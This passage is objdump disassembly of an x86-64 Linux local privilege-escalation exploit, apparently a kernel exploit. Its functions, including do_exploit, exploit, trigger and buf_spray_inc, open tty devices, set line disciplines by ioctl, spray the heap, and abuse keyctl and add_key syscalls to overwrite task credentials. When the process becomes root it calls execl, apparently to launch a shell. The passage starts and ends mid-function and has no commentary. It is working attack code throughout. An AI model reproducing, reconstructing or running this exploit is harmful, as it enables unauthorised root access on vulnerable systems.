  401207:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40120c:	e9 99 00 00 00       	jmpq   4012aa <hex_to_char+0x15a>
  401211:	0f b6 45 f1          	movzbl -0xf(%rbp),%eax
  401215:	3c 2f                	cmp    $0x2f,%al
  401217:	7e 17                	jle    401230 <hex_to_char+0xe0>
  401219:	0f b6 45 f1          	movzbl -0xf(%rbp),%eax
  40121d:	3c 39                	cmp    $0x39,%al
  40121f:	7f 0f                	jg     401230 <hex_to_char+0xe0>
  401221:	0f b6 45 f1          	movzbl -0xf(%rbp),%eax
  401225:	0f be c0             	movsbl %al,%eax
  401228:	83 e8 30             	sub    $0x30,%eax
  40122b:	01 45 fc             	add    %eax,-0x4(%rbp)
  40122e:	eb 6a                	jmp    40129a <hex_to_char+0x14a>
  401230:	0f b6 45 f1          	movzbl -0xf(%rbp),%eax
  401234:	3c 40                	cmp    $0x40,%al
  401236:	7e 17                	jle    40124f <hex_to_char+0xff>
  401238:	0f b6 45 f1          	movzbl -0xf(%rbp),%eax
  40123c:	3c 46                	cmp    $0x46,%al
  40123e:	7f 0f                	jg     40124f <hex_to_char+0xff>
  401240:	0f b6 45 f1          	movzbl -0xf(%rbp),%eax
  401244:	0f be c0             	movsbl %al,%eax
  401247:	83 e8 37             	sub    $0x37,%eax
  40124a:	01 45 fc             	add    %eax,-0x4(%rbp)
  40124d:	eb 4b                	jmp    40129a <hex_to_char+0x14a>
  40124f:	0f b6 45 f1          	movzbl -0xf(%rbp),%eax
  401253:	3c 60                	cmp    $0x60,%al
  401255:	7e 17                	jle    40126e <hex_to_char+0x11e>
  401257:	0f b6 45 f1          	movzbl -0xf(%rbp),%eax
  40125b:	3c 66                	cmp    $0x66,%al
  40125d:	7f 0f                	jg     40126e <hex_to_char+0x11e>
  40125f:	0f b6 45 f1          	movzbl -0xf(%rbp),%eax
  401263:	0f be c0             	movsbl %al,%eax
  401266:	83 e8 57             	sub    $0x57,%eax
  401269:	01 45 fc             	add    %eax,-0x4(%rbp)
  40126c:	eb 2c                	jmp    40129a <hex_to_char+0x14a>
  40126e:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
  401275:	48 8b 05 84 20 20 00 	mov    0x202084(%rip),%rax        # 603300 <stderr@@GLIBC_2.2.5>
  40127c:	48 89 c1             	mov    %rax,%rcx
  40127f:	ba 0b 00 00 00       	mov    $0xb,%edx
  401284:	be 01 00 00 00       	mov    $0x1,%esi
  401289:	bf c3 24 40 00       	mov    $0x4024c3,%edi
  40128e:	e8 7d fa ff ff       	callq  400d10 <fwrite@plt>
  401293:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  401298:	eb 10                	jmp    4012aa <hex_to_char+0x15a>
  40129a:	8b 45 fc             	mov    -0x4(%rbp),%eax
  40129d:	89 c2                	mov    %eax,%edx
  40129f:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  4012a3:	88 10                	mov    %dl,(%rax)
  4012a5:	b8 00 00 00 00       	mov    $0x0,%eax
  4012aa:	c9                   	leaveq 
  4012ab:	c3                   	retq   

00000000004012ac <buf_to_task_struct>:
  4012ac:	55                   	push   %rbp
  4012ad:	48 89 e5             	mov    %rsp,%rbp
  4012b0:	48 83 ec 40          	sub    $0x40,%rsp
  4012b4:	48 89 7d c8          	mov    %rdi,-0x38(%rbp)
  4012b8:	48 89 75 c0          	mov    %rsi,-0x40(%rbp)
  4012bc:	48 c7 45 f8 24 00 00 	movq   $0x24,-0x8(%rbp)
  4012c3:	00 
  4012c4:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4012c8:	48 8b 55 c0          	mov    -0x40(%rbp),%rdx
  4012cc:	48 01 d0             	add    %rdx,%rax
  4012cf:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
  4012d3:	48 c7 45 e8 00 00 00 	movq   $0x0,-0x18(%rbp)
  4012da:	00 
  4012db:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  4012df:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  4012e3:	eb 3f                	jmp    401324 <buf_to_task_struct+0x78>
  4012e5:	48 8d 55 db          	lea    -0x25(%rbp),%rdx
  4012e9:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  4012ed:	48 89 d6             	mov    %rdx,%rsi
  4012f0:	48 89 c7             	mov    %rax,%rdi
  4012f3:	e8 58 fe ff ff       	callq  401150 <hex_to_char>
  4012f8:	89 45 dc             	mov    %eax,-0x24(%rbp)
  4012fb:	83 7d dc ff          	cmpl   $0xffffffff,-0x24(%rbp)
  4012ff:	75 07                	jne    401308 <buf_to_task_struct+0x5c>
  401301:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  401306:	eb 2b                	jmp    401333 <buf_to_task_struct+0x87>
  401308:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  40130c:	48 8d 50 01          	lea    0x1(%rax),%rdx
  401310:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
  401314:	0f b6 55 db          	movzbl -0x25(%rbp),%edx
  401318:	88 10                	mov    %dl,(%rax)
  40131a:	48 83 45 e8 01       	addq   $0x1,-0x18(%rbp)
  40131f:	48 83 45 e0 02       	addq   $0x2,-0x20(%rbp)
  401324:	48 81 7d e8 87 06 00 	cmpq   $0x687,-0x18(%rbp)
  40132b:	00 
  40132c:	76 b7                	jbe    4012e5 <buf_to_task_struct+0x39>
  40132e:	b8 00 00 00 00       	mov    $0x0,%eax
  401333:	c9                   	leaveq 
  401334:	c3                   	retq   

0000000000401335 <do_exploit>:
  401335:	55                   	push   %rbp
  401336:	48 89 e5             	mov    %rsp,%rbp
  401339:	48 81 ec d0 86 00 00 	sub    $0x86d0,%rsp
  401340:	89 bd 3c 79 ff ff    	mov    %edi,-0x86c4(%rbp)
  401346:	89 b5 38 79 ff ff    	mov    %esi,-0x86c8(%rbp)
  40134c:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  401353:	00 00 
  401355:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  401359:	31 c0                	xor    %eax,%eax
  40135b:	48 c7 85 58 79 ff ff 	movq   $0x606360,-0x86a8(%rbp)
  401362:	60 63 60 00 
  401366:	48 8b 85 58 79 ff ff 	mov    -0x86a8(%rbp),%rax
  40136d:	48 8b 40 18          	mov    0x18(%rax),%rax
  401371:	48 89 05 f8 5f 20 00 	mov    %rax,0x205ff8(%rip)        # 607370 <real_master_desc>
  401378:	48 8b 05 f1 5f 20 00 	mov    0x205ff1(%rip),%rax        # 607370 <real_master_desc>
  40137f:	48 83 e8 08          	sub    $0x8,%rax
  401383:	48 89 05 96 1f 20 00 	mov    %rax,0x201f96(%rip)        # 603320 <real_format>
  40138a:	48 8b 05 df 5f 20 00 	mov    0x205fdf(%rip),%rax        # 607370 <real_master_desc>
  401391:	48 83 c0 0d          	add    $0xd,%rax
  401395:	48 89 05 cc 5f 20 00 	mov    %rax,0x205fcc(%rip)        # 607368 <real_datalen>
  40139c:	48 b8 00 00 00 00 ff 	movabs $0xffffffff00000000,%rax
  4013a3:	ff ff ff 
  4013a6:	48 89 85 50 79 ff ff 	mov    %rax,-0x86b0(%rbp)
  4013ad:	48 8d 85 f0 7f ff ff 	lea    -0x8010(%rbp),%rax
  4013b4:	ba 00 80 00 00       	mov    $0x8000,%edx
  4013b9:	be 00 00 00 00       	mov    $0x0,%esi
  4013be:	48 89 c7             	mov    %rax,%rdi
  4013c1:	e8 5a f8 ff ff       	callq  400c20 <memset@plt>
  4013c6:	48 8d 8d f0 7f ff ff 	lea    -0x8010(%rbp),%rcx
  4013cd:	48 8b 95 50 79 ff ff 	mov    -0x86b0(%rbp),%rdx
  4013d4:	8b b5 38 79 ff ff    	mov    -0x86c8(%rbp),%esi
  4013da:	8b 85 3c 79 ff ff    	mov    -0x86c4(%rbp),%eax
  4013e0:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
  4013e6:	49 89 c8             	mov    %rcx,%r8
  4013e9:	b9 88 06 00 00       	mov    $0x688,%ecx
  4013ee:	89 c7                	mov    %eax,%edi
  4013f0:	e8 5f fc ff ff       	callq  401054 <get_addr_info>
  4013f5:	89 85 4c 79 ff ff    	mov    %eax,-0x86b4(%rbp)
  4013fb:	83 bd 4c 79 ff ff ff 	cmpl   $0xffffffff,-0x86b4(%rbp)
  401402:	75 23                	jne    401427 <do_exploit+0xf2>
  401404:	48 8b 05 f5 1e 20 00 	mov    0x201ef5(%rip),%rax        # 603300 <stderr@@GLIBC_2.2.5>
  40140b:	48 89 c1             	mov    %rax,%rcx
  40140e:	ba 12 00 00 00       	mov    $0x12,%edx
  401413:	be 01 00 00 00       	mov    $0x1,%esi
  401418:	bf cf 24 40 00       	mov    $0x4024cf,%edi
  40141d:	e8 ee f8 ff ff       	callq  400d10 <fwrite@plt>
  401422:	e9 a1 01 00 00       	jmpq   4015c8 <do_exploit+0x293>
  401427:	48 8d 85 60 79 ff ff 	lea    -0x86a0(%rbp),%rax
  40142e:	ba 88 06 00 00       	mov    $0x688,%edx
  401433:	be 00 00 00 00       	mov    $0x0,%esi
  401438:	48 89 c7             	mov    %rax,%rdi
  40143b:	e8 e0 f7 ff ff       	callq  400c20 <memset@plt>
  401440:	48 8d 95 f0 7f ff ff 	lea    -0x8010(%rbp),%rdx
  401447:	48 8d 85 60 79 ff ff 	lea    -0x86a0(%rbp),%rax
  40144e:	48 89 d6             	mov    %rdx,%rsi
  401451:	48 89 c7             	mov    %rax,%rdi
  401454:	e8 53 fe ff ff       	callq  4012ac <buf_to_task_struct>
  401459:	48 8d 85 60 79 ff ff 	lea    -0x86a0(%rbp),%rax
  401460:	48 05 78 06 00 00    	add    $0x678,%rax
  401466:	be e2 24 40 00       	mov    $0x4024e2,%esi
  40146b:	48 89 c7             	mov    %rax,%rdi
  40146e:	e8 fd f7 ff ff       	callq  400c70 <strcmp@plt>
  401473:	85 c0                	test   %eax,%eax
  401475:	0f 85 34 01 00 00    	jne    4015af <do_exploit+0x27a>
  40147b:	48 8b 05 7e 1e 20 00 	mov    0x201e7e(%rip),%rax        # 603300 <stderr@@GLIBC_2.2.5>
  401482:	48 89 c1             	mov    %rax,%rcx
  401485:	ba 0b 00 00 00       	mov    $0xb,%edx
  40148a:	be 01 00 00 00       	mov    $0x1,%esi
  40148f:	bf e8 24 40 00       	mov    $0x4024e8,%edi
  401494:	e8 77 f8 ff ff       	callq  400d10 <fwrite@plt>
  401499:	48 8b 95 d0 7f ff ff 	mov    -0x8030(%rbp),%rdx
  4014a0:	48 8b 05 59 1e 20 00 	mov    0x201e59(%rip),%rax        # 603300 <stderr@@GLIBC_2.2.5>
  4014a7:	be f4 24 40 00       	mov    $0x4024f4,%esi
  4014ac:	48 89 c7             	mov    %rax,%rdi
  4014af:	b8 00 00 00 00       	mov    $0x0,%eax
  4014b4:	e8 c7 f7 ff ff       	callq  400c80 <fprintf@plt>
  4014b9:	48 8b 85 58 79 ff ff 	mov    -0x86a8(%rbp),%rax
  4014c0:	66 c7 40 3a 18 00    	movw   $0x18,0x3a(%rax)
  4014c6:	48 8b 85 d0 7f ff ff 	mov    -0x8030(%rbp),%rax
  4014cd:	48 8d 50 04          	lea    0x4(%rax),%rdx
  4014d1:	48 8b 85 58 79 ff ff 	mov    -0x86a8(%rbp),%rax
  4014d8:	48 89 50 40          	mov    %rdx,0x40(%rax)
  4014dc:	8b 85 3c 79 ff ff    	mov    -0x86c4(%rbp),%eax
  4014e2:	ba 04 10 00 00       	mov    $0x1004,%edx
  4014e7:	be 60 63 60 00       	mov    $0x606360,%esi
  4014ec:	89 c7                	mov    %eax,%edi
  4014ee:	e8 cd f6 ff ff       	callq  400bc0 <write@plt>
  4014f3:	8b 85 38 79 ff ff    	mov    -0x86c8(%rbp),%eax
  4014f9:	89 c2                	mov    %eax,%edx
  4014fb:	be 03 00 00 00       	mov    $0x3,%esi
  401500:	bf fa 00 00 00       	mov    $0xfa,%edi
  401505:	b8 00 00 00 00       	mov    $0x0,%eax
  40150a:	e8 81 f7 ff ff       	callq  400c90 <syscall@plt>
  40150f:	bf 90 5f 01 00       	mov    $0x15f90,%edi
  401514:	e8 37 f8 ff ff       	callq  400d50 <usleep@plt>
  401519:	8b 35 81 1d 20 00    	mov    0x201d81(%rip),%esi        # 6032a0 <keyring>
  40151f:	48 8b 0d 6a 1d 20 00 	mov    0x201d6a(%rip),%rcx        # 603290 <pld_lastlen>
  401526:	48 8b 15 9b 1c 20 00 	mov    0x201c9b(%rip),%rdx        # 6031c8 <desc>
  40152d:	48 8b 05 8c 1c 20 00 	mov    0x201c8c(%rip),%rax        # 6031c0 <type>
  401534:	41 89 f1             	mov    %esi,%r9d
  401537:	49 89 c8             	mov    %rcx,%r8
  40153a:	b9 00 32 60 00       	mov    $0x603200,%ecx
  40153f:	48 89 c6             	mov    %rax,%rsi
  401542:	bf f8 00 00 00       	mov    $0xf8,%edi
  401547:	b8 00 00 00 00       	mov    $0x0,%eax
  40154c:	e8 3f f7 ff ff       	callq  400c90 <syscall@plt>
  401551:	89 85 38 79 ff ff    	mov    %eax,-0x86c8(%rbp)
  401557:	bf 07 25 40 00       	mov    $0x402507,%edi
  40155c:	e8 7f f7 ff ff       	callq  400ce0 <perror@plt>
  401561:	bf 01 00 00 00       	mov    $0x1,%edi
  401566:	e8 d5 f7 ff ff       	callq  400d40 <sleep@plt>
  40156b:	e8 70 f6 ff ff       	callq  400be0 <getuid@plt>
  401570:	85 c0                	test   %eax,%eax
  401572:	75 39                	jne    4015ad <do_exploit+0x278>
  401574:	48 8b 05 85 1d 20 00 	mov    0x201d85(%rip),%rax        # 603300 <stderr@@GLIBC_2.2.5>
  40157b:	48 89 c1             	mov    %rax,%rcx
  40157e:	ba 09 00 00 00       	mov    $0x9,%edx
  401583:	be 01 00 00 00       	mov    $0x1,%esi
  401588:	bf 0f 25 40 00       	mov    $0x40250f,%edi
  40158d:	e8 7e f7 ff ff       	callq  400d10 <fwrite@plt>
  401592:	ba 00 00 00 00       	mov    $0x0,%edx
  401597:	be 19 25 40 00       	mov    $0x402519,%esi
  40159c:	bf 19 25 40 00       	mov    $0x402519,%edi
  4015a1:	b8 00 00 00 00       	mov    $0x0,%eax
  4015a6:	e8 85 f7 ff ff       	callq  400d30 <execl@plt>
  4015ab:	eb 1b                	jmp    4015c8 <do_exploit+0x293>
  4015ad:	eb 19                	jmp    4015c8 <do_exploit+0x293>
  4015af:	48 8b 85 90 7d ff ff 	mov    -0x8270(%rbp),%rax
  4015b6:	48 2d 30 04 00 00    	sub    $0x430,%rax
  4015bc:	48 89 85 50 79 ff ff 	mov    %rax,-0x86b0(%rbp)
  4015c3:	e9 e5 fd ff ff       	jmpq   4013ad <do_exploit+0x78>
  4015c8:	8b 85 38 79 ff ff    	mov    -0x86c8(%rbp),%eax
  4015ce:	89 c2                	mov    %eax,%edx
  4015d0:	be 03 00 00 00       	mov    $0x3,%esi
  4015d5:	bf fa 00 00 00       	mov    $0xfa,%edi
  4015da:	b8 00 00 00 00       	mov    $0x0,%eax
  4015df:	e8 ac f6 ff ff       	callq  400c90 <syscall@plt>
  4015e4:	8b 05 7a 5d 20 00    	mov    0x205d7a(%rip),%eax        # 607364 <key1>
  4015ea:	89 c2                	mov    %eax,%edx
  4015ec:	be 03 00 00 00       	mov    $0x3,%esi
  4015f1:	bf fa 00 00 00       	mov    $0xfa,%edi
  4015f6:	b8 00 00 00 00       	mov    $0x0,%eax
  4015fb:	e8 90 f6 ff ff       	callq  400c90 <syscall@plt>
  401600:	8b 05 42 2d 20 00    	mov    0x202d42(%rip),%eax        # 604348 <key2>
  401606:	89 c2                	mov    %eax,%edx
  401608:	be 03 00 00 00       	mov    $0x3,%esi
  40160d:	bf fa 00 00 00       	mov    $0xfa,%edi
  401612:	b8 00 00 00 00       	mov    $0x0,%eax
  401617:	e8 74 f6 ff ff       	callq  400c90 <syscall@plt>
  40161c:	8b 05 56 5d 20 00    	mov    0x205d56(%rip),%eax        # 607378 <userkey>
  401622:	89 c2                	mov    %eax,%edx
  401624:	be 03 00 00 00       	mov    $0x3,%esi
  401629:	bf fa 00 00 00       	mov    $0xfa,%edi
  40162e:	b8 00 00 00 00       	mov    $0x0,%eax
  401633:	e8 58 f6 ff ff       	callq  400c90 <syscall@plt>
  401638:	bf 00 00 00 00       	mov    $0x0,%edi
  40163d:	e8 be f6 ff ff       	callq  400d00 <exit@plt>

0000000000401642 <exploit>:
  401642:	55                   	push   %rbp
  401643:	48 89 e5             	mov    %rsp,%rbp
  401646:	48 83 ec 10          	sub    $0x10,%rsp
  40164a:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
  401651:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
  401658:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
  40165f:	e9 16 01 00 00       	jmpq   40177a <exploit+0x138>
  401664:	8b 45 f4             	mov    -0xc(%rbp),%eax
  401667:	48 98                	cltq   
  401669:	8b 04 85 40 31 60 00 	mov    0x603140(,%rax,4),%eax
  401670:	ba 04 10 00 00       	mov    $0x1004,%edx
  401675:	be 60 63 60 00       	mov    $0x606360,%esi
  40167a:	89 c7                	mov    %eax,%edi
  40167c:	e8 3f f5 ff ff       	callq  400bc0 <write@plt>
  401681:	83 7d f8 00          	cmpl   $0x0,-0x8(%rbp)
  401685:	74 1d                	je     4016a4 <exploit+0x62>
  401687:	8b 45 f4             	mov    -0xc(%rbp),%eax
  40168a:	48 98                	cltq   
  40168c:	8b 04 85 40 31 60 00 	mov    0x603140(,%rax,4),%eax
  401693:	ba 04 10 00 00       	mov    $0x1004,%edx
  401698:	be 40 33 60 00       	mov    $0x603340,%esi
  40169d:	89 c7                	mov    %eax,%edi
  40169f:	e8 ac f5 ff ff       	callq  400c50 <read@plt>
  4016a4:	48 8b 15 ed 1b 20 00 	mov    0x201bed(%rip),%rdx        # 603298 <upd_plen>
  4016ab:	8b 05 93 2c 20 00    	mov    0x202c93(%rip),%eax        # 604344 <key>
  4016b1:	49 89 d0             	mov    %rdx,%r8
  4016b4:	b9 60 32 60 00       	mov    $0x603260,%ecx
  4016b9:	89 c2                	mov    %eax,%edx
  4016bb:	be 02 00 00 00       	mov    $0x2,%esi
  4016c0:	bf fa 00 00 00       	mov    $0xfa,%edi
  4016c5:	b8 00 00 00 00       	mov    $0x0,%eax
  4016ca:	e8 c1 f5 ff ff       	callq  400c90 <syscall@plt>
  4016cf:	89 45 fc             	mov    %eax,-0x4(%rbp)
  4016d2:	83 7d fc ff          	cmpl   $0xffffffff,-0x4(%rbp)
  4016d6:	0f 85 9a 00 00 00    	jne    401776 <exploit+0x134>
  4016dc:	83 7d f8 00          	cmpl   $0x0,-0x8(%rbp)
  4016e0:	75 1e                	jne    401700 <exploit+0xbe>
  4016e2:	48 8b 05 17 1c 20 00 	mov    0x201c17(%rip),%rax        # 603300 <stderr@@GLIBC_2.2.5>
  4016e9:	48 89 c1             	mov    %rax,%rcx
  4016ec:	ba 1b 00 00 00       	mov    $0x1b,%edx
  4016f1:	be 01 00 00 00       	mov    $0x1,%esi
  4016f6:	bf 21 25 40 00       	mov    $0x402521,%edi
  4016fb:	e8 10 f6 ff ff       	callq  400d10 <fwrite@plt>
  401700:	e8 8b f4 ff ff       	callq  400b90 <__errno_location@plt>
  401705:	8b 00                	mov    (%rax),%eax
  401707:	83 f8 16             	cmp    $0x16,%eax
  40170a:	75 1b                	jne    401727 <exploit+0xe5>
  40170c:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%rbp)
  401713:	e8 ce f8 ff ff       	callq  400fe6 <buf_spray_inc>
  401718:	bf b8 0b 00 00       	mov    $0xbb8,%edi
  40171d:	e8 2e f6 ff ff       	callq  400d50 <usleep@plt>
  401722:	e9 3d ff ff ff       	jmpq   401664 <exploit+0x22>
  401727:	e8 64 f4 ff ff       	callq  400b90 <__errno_location@plt>
  40172c:	8b 00                	mov    (%rax),%eax
  40172e:	83 f8 7a             	cmp    $0x7a,%eax
  401731:	75 39                	jne    40176c <exploit+0x12a>
  401733:	48 8b 05 c6 1b 20 00 	mov    0x201bc6(%rip),%rax        # 603300 <stderr@@GLIBC_2.2.5>
  40173a:	48 89 c1             	mov    %rax,%rcx
  40173d:	ba 0c 00 00 00       	mov    $0xc,%edx
  401742:	be 01 00 00 00       	mov    $0x1,%esi
  401747:	bf 3d 25 40 00       	mov    $0x40253d,%edi
  40174c:	e8 bf f5 ff ff       	callq  400d10 <fwrite@plt>
  401751:	8b 15 ed 2b 20 00    	mov    0x202bed(%rip),%edx        # 604344 <key>
  401757:	8b 45 f4             	mov    -0xc(%rbp),%eax
  40175a:	48 98                	cltq   
  40175c:	8b 04 85 40 31 60 00 	mov    0x603140(,%rax,4),%eax
  401763:	89 d6                	mov    %edx,%esi
  401765:	89 c7                	mov    %eax,%edi
  401767:	e8 c9 fb ff ff       	callq  401335 <do_exploit>
  40176c:	bf ff ff ff ff       	mov    $0xffffffff,%edi
  401771:	e8 8a f5 ff ff       	callq  400d00 <exit@plt>
  401776:	83 45 f4 01          	addl   $0x1,-0xc(%rbp)
  40177a:	83 7d f4 13          	cmpl   $0x13,-0xc(%rbp)
  40177e:	0f 8e e0 fe ff ff    	jle    401664 <exploit+0x22>
  401784:	c9                   	leaveq 
  401785:	c3                   	retq   

0000000000401786 <prepare_fdexp>:
  401786:	55                   	push   %rbp
  401787:	48 89 e5             	mov    %rsp,%rbp
  40178a:	48 83 ec 10          	sub    $0x10,%rsp
  40178e:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
  401795:	e9 8a 00 00 00       	jmpq   401824 <prepare_fdexp+0x9e>
  40179a:	be 02 08 00 00       	mov    $0x802,%esi
  40179f:	bf 4a 25 40 00       	mov    $0x40254a,%edi
  4017a4:	b8 00 00 00 00       	mov    $0x0,%eax
  4017a9:	e8 22 f5 ff ff       	callq  400cd0 <open@plt>
  4017ae:	8b 55 f8             	mov    -0x8(%rbp),%edx
  4017b1:	48 63 d2             	movslq %edx,%rdx
  4017b4:	89 04 95 40 31 60 00 	mov    %eax,0x603140(,%rdx,4)
  4017bb:	8b 45 f8             	mov    -0x8(%rbp),%eax
  4017be:	48 98                	cltq   
  4017c0:	8b 04 85 40 31 60 00 	mov    0x603140(,%rax,4),%eax
  4017c7:	83 f8 ff             	cmp    $0xffffffff,%eax
  4017ca:	74 54                	je     401820 <prepare_fdexp+0x9a>
  4017cc:	c7 45 f4 0d 00 00 00 	movl   $0xd,-0xc(%rbp)
  4017d3:	8b 45 f8             	mov    -0x8(%rbp),%eax
  4017d6:	48 98                	cltq   
  4017d8:	8b 04 85 40 31 60 00 	mov    0x603140(,%rax,4),%eax
  4017df:	48 8d 55 f4          	lea    -0xc(%rbp),%rdx
  4017e3:	be 23 54 00 00       	mov    $0x5423,%esi
  4017e8:	89 c7                	mov    %eax,%edi
  4017ea:	b8 00 00 00 00       	mov    $0x0,%eax
  4017ef:	e8 3c f4 ff ff       	callq  400c30 <ioctl@plt>
  4017f4:	89 45 fc             	mov    %eax,-0x4(%rbp)
  4017f7:	83 7d fc ff          	cmpl   $0xffffffff,-0x4(%rbp)
  4017fb:	75 23                	jne    401820 <prepare_fdexp+0x9a>
  4017fd:	8b 45 f8             	mov    -0x8(%rbp),%eax
  401800:	48 98                	cltq   
  401802:	8b 04 85 40 31 60 00 	mov    0x603140(,%rax,4),%eax
  401809:	89 c7                	mov    %eax,%edi
  40180b:	e8 30 f4 ff ff       	callq  400c40 <close@plt>
  401810:	8b 45 f8             	mov    -0x8(%rbp),%eax
  401813:	48 98                	cltq   
  401815:	c7 04 85 40 31 60 00 	movl   $0xffffffff,0x603140(,%rax,4)
  40181c:	ff ff ff ff 
  401820:	83 45 f8 01          	addl   $0x1,-0x8(%rbp)
  401824:	83 7d f8 13          	cmpl   $0x13,-0x8(%rbp)
  401828:	0f 8e 6c ff ff ff    	jle    40179a <prepare_fdexp+0x14>
  40182e:	c9                   	leaveq 
  40182f:	c3                   	retq   

0000000000401830 <failed_fdexp>:
  401830:	55                   	push   %rbp
  401831:	48 89 e5             	mov    %rsp,%rbp
  401834:	48 83 ec 10          	sub    $0x10,%rsp
  401838:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
  40183f:	eb 27                	jmp    401868 <failed_fdexp+0x38>
  401841:	8b 45 fc             	mov    -0x4(%rbp),%eax
  401844:	48 98                	cltq   
  401846:	8b 04 85 40 31 60 00 	mov    0x603140(,%rax,4),%eax
  40184d:	89 c7                	mov    %eax,%edi
  40184f:	e8 ec f3 ff ff       	callq  400c40 <close@plt>
  401854:	8b 45 fc             	mov    -0x4(%rbp),%eax
  401857:	48 98                	cltq   
  401859:	c7 04 85 40 31 60 00 	movl   $0xffffffff,0x603140(,%rax,4)
  401860:	ff ff ff ff 
  401864:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
  401868:	83 7d fc 13          	cmpl   $0x13,-0x4(%rbp)
  40186c:	7e d3                	jle    401841 <failed_fdexp+0x11>
  40186e:	c9                   	leaveq 
  40186f:	c3                   	retq   

0000000000401870 <trigger>:
  401870:	55                   	push   %rbp
  401871:	48 89 e5             	mov    %rsp,%rbp
  401874:	53                   	push   %rbx
  401875:	48 81 ec a8 00 00 00 	sub    $0xa8,%rsp
  40187c:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  401883:	00 00 
  401885:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  401889:	31 c0                	xor    %eax,%eax
  40188b:	48 89 e0             	mov    %rsp,%rax
  40188e:	48 89 c3             	mov    %rax,%rbx
  401891:	c7 85 58 ff ff ff 01 	movl   $0x1,-0xa8(%rbp)
  401898:	00 00 00 
  40189b:	8b 85 58 ff ff ff    	mov    -0xa8(%rbp),%eax
  4018a1:	4c 63 c0             	movslq %eax,%r8
  4018a4:	49 83 e8 01          	sub    $0x1,%r8
  4018a8:	4c 89 85 70 ff ff ff 	mov    %r8,-0x90(%rbp)
  4018af:	4c 63 c0             	movslq %eax,%r8
  4018b2:	4c 89 c6             	mov    %r8,%rsi
  4018b5:	bf 00 00 00 00       	mov    $0x0,%edi
  4018ba:	48 63 f0             	movslq %eax,%rsi
  4018bd:	48 89 f2             	mov    %rsi,%rdx
  4018c0:	b9 00 00 00 00       	mov    $0x0,%ecx
  4018c5:	48 98                	cltq   
  4018c7:	48 c1 e0 02          	shl    $0x2,%rax
  4018cb:	48 8d 50 03          	lea    0x3(%rax),%rdx
  4018cf:	b8 10 00 00 00       	mov    $0x10,%eax
  4018d4:	48 83 e8 01          	sub    $0x1,%rax
  4018d8:	48 01 d0             	add    %rdx,%rax
  4018db:	b9 10 00 00 00       	mov    $0x10,%ecx
  4018e0:	ba 00 00 00 00       	mov    $0x0,%edx
  4018e5:	48 f7 f1             	div    %rcx
  4018e8:	48 6b c0 10          	imul   $0x10,%rax,%rax
  4018ec:	48 29 c4             	sub    %rax,%rsp
  4018ef:	48 89 e0             	mov    %rsp,%rax
  4018f2:	48 83 c0 03          	add    $0x3,%rax
  4018f6:	48 c1 e8 02          	shr    $0x2,%rax
  4018fa:	48 c1 e0 02          	shl    $0x2,%rax
  4018fe:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  401905:	c7 85 54 ff ff ff 00 	movl   $0x0,-0xac(%rbp)
  40190c:	00 00 00 
  40190f:	c7 85 54 ff ff ff 00 	movl   $0x0,-0xac(%rbp)
  401916:	00 00 00 
  401919:	e9 0e 02 00 00       	jmpq   401b2c <trigger+0x2bc>
  40191e:	be 02 00 00 00       	mov    $0x2,%esi
  401923:	bf 4a 25 40 00       	mov    $0x40254a,%edi
  401928:	b8 00 00 00 00       	mov    $0x0,%eax
  40192d:	e8 9e f3 ff ff       	callq  400cd0 <open@plt>
  401932:	48 8b 95 78 ff ff ff 	mov    -0x88(%rbp),%rdx
  401939:	8b 8d 54 ff ff ff    	mov    -0xac(%rbp),%ecx
  40193f:	48 63 c9             	movslq %ecx,%rcx
  401942:	89 04 8a             	mov    %eax,(%rdx,%rcx,4)
  401945:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40194c:	8b 95 54 ff ff ff    	mov    -0xac(%rbp),%edx
  401952:	48 63 d2             	movslq %edx,%rdx
  401955:	8b 04 90             	mov    (%rax,%rdx,4),%eax
  401958:	83 f8 ff             	cmp    $0xffffffff,%eax
  40195b:	75 0f                	jne    40196c <trigger+0xfc>
  40195d:	bf 54 25 40 00       	mov    $0x402554,%edi
  401962:	e8 79 f3 ff ff       	callq  400ce0 <perror@plt>
  401967:	e9 14 02 00 00       	jmpq   401b80 <trigger+0x310>
  40196c:	c7 85 50 ff ff ff 0d 	movl   $0xd,-0xb0(%rbp)
  401973:	00 00 00 
  401976:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40197d:	8b 95 54 ff ff ff    	mov    -0xac(%rbp),%edx
  401983:	48 63 d2             	movslq %edx,%rdx
  401986:	8b 04 90             	mov    (%rax,%rdx,4),%eax
  401989:	48 8d 95 50 ff ff ff 	lea    -0xb0(%rbp),%rdx
  401990:	be 23 54 00 00       	mov    $0x5423,%esi
  401995:	89 c7                	mov    %eax,%edi
  401997:	b8 00 00 00 00       	mov    $0x0,%eax
  40199c:	e8 8f f2 ff ff       	callq  400c30 <ioctl@plt>
  4019a1:	89 85 5c ff ff ff    	mov    %eax,-0xa4(%rbp)
  4019a7:	83 bd 5c ff ff ff ff 	cmpl   $0xffffffff,-0xa4(%rbp)
  4019ae:	75 19                	jne    4019c9 <trigger+0x159>
  4019b0:	bf 59 25 40 00       	mov    $0x402559,%edi
